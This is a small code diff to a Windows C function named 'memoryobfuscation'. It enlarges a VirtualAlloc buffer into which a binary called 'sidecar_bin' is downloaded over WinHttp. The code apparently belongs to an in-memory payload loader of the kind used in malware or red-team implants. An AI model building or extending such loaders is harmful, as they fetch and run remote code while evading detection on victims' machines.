@@ -176,7 +176,7 @@ void memoryobfuscation(){
         
     DWORD size = 0;
     DWORD sidecar_bin_len = 0;
-    unsigned char* sidecar_bin = (unsigned char*)VirtualAlloc(NULL, 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    unsigned char* sidecar_bin = (unsigned char*)VirtualAlloc(NULL, 0x20000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
       
     while (WinHttpReadData(hRequest, sidecar_bin + sidecar_bin_len, 0x1000, &size) && size > 0) {
         sidecar_bin_len += size;
